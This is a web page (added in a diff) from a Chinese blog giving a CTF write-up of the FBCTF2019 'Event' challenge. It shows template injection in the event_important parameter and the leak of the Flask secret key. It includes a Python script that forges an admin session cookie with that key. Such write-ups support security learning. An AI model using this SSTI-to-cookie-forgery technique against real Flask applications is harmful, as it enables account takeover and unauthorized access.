@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[FBCTF2019]Event(SSTI3) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[FBCTF2019]Event(SSTI3)</h2>
+            <div class="post-date">2020-01-26</div>
+            
+            <div class="post-content">
+              <p>功能很简单。就一个登陆。一个查看flag。但是flag没有权限</p>
+<!-- more -->
+<p><img src="https://guokeya.github.io/post-images/1580025926487.png" alt="" loading="lazy"><br>
+随便注册个用户看看。存在留言功能<br>
+<img src="https://guokeya.github.io/post-images/1580025991926.png" alt="" loading="lazy"><br>
+发送留言处event_important参数存在SSTI。<br>
+<img src="https://guokeya.github.io/post-images/1580026303485.png" alt="" loading="lazy"><br>
+别问我为什么用<code>__class__</code><br>
+一开始。用的是{{2*2}}<br>
+发现留言并没有成功。是不是{{}}导致程序出错了。<br>
+然后去掉{{}}不行。再去掉单引号。还是不行。最后去掉点。就可以了。。<br>
+不知道后端咋写的<br>
+既然有SSTI。就好办了。我们通过读取密钥。然后伪造cookie。成为admin就能拿到flag<br>
+<img src="https://guokeya.github.io/post-images/1580026389171.png" alt="" loading="lazy"><br>
+拿到密钥<br>
+<img src="https://guokeya.github.io/post-images/1580026426223.png" alt="" loading="lazy"><br>
+开始解密<br>
+<img src="https://guokeya.github.io/post-images/1580026458850.png" alt="" loading="lazy"><br>
+这里解密了两个cookies。感觉user的值才是用来判断用户名的<br>
+<img src="https://guokeya.github.io/post-images/1580026496643.png" alt="" loading="lazy"><br>
+但是问题来了。这个解密的字符串就一个test。和之前有点不太一样。所以。我们也无法获得admin身份的session<br>
+看了writeup。这里还有种办法。使用python搭一个flask。然后得到session<br>
+<code>https://xz.aliyun.com/t/5399#toc-1</code></p>
+<pre><code>from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'
+session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+@app.route('/')
+def index():
+    print(session_serializer.dumps(&quot;admin&quot;))
+index()
+</code></pre>
+<p>用python2不行。python3输出替换user<br>
+<img src="https://guokeya.github.io/post-images/1580026687349.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/php-de-session-fan-xu-lie-hua/">
+                  <h3 class="post-title">
+                    PHP的Session反序列化
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
